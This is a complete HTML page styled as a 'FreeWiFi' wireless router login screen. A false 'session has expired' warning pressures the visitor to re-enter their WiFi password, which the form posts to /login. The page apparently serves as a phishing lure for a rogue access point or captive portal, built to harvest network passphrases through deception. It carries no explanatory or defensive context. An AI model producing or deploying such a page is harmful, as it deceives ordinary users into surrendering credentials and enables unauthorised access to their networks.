<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
body { font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 40px 20px; }
.box { max-width: 380px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); padding: 30px; }
h1 { color: #2c3e50; font-size: 22px; margin: 0 0 6px; text-align: center; }
p.sub { color: #7f8c8d; font-size: 13px; text-align: center; margin: 0 0 24px; }
.field { margin-bottom: 14px; }
label { display: block; font-size: 12px; color: #34495e; margin-bottom: 4px; font-weight: bold; }
input[type=text], input[type=password] { width: 100%; padding: 10px; border: 1px solid #bdc3c7; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
button { width: 100%; padding: 12px; background: #3498db; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: bold; cursor: pointer; margin-top: 8px; }
button:hover { background: #2980b9; }
.warn { background: #fff3cd; border-left: 4px solid #ffc107; padding: 10px; margin-bottom: 16px; font-size: 12px; color: #856404; border-radius: 4px; }
</style>
</head>
<body>
<div class="box">
<h1>📶 FreeWiFi</h1>
<p class="sub">Wireless Router Configuration</p>
<div class="warn">
⚠️ Your session has expired. Please re-enter your WiFi password to continue browsing.
</div>
<form method="POST" action="/login">
<div class="field">
<label>WiFi Password</label>
<input type="password" name="password" placeholder="Enter your WiFi password" required autofocus>
</div>
<button type="submit">Connect</button>
</form>
</div>
</body>
</html>
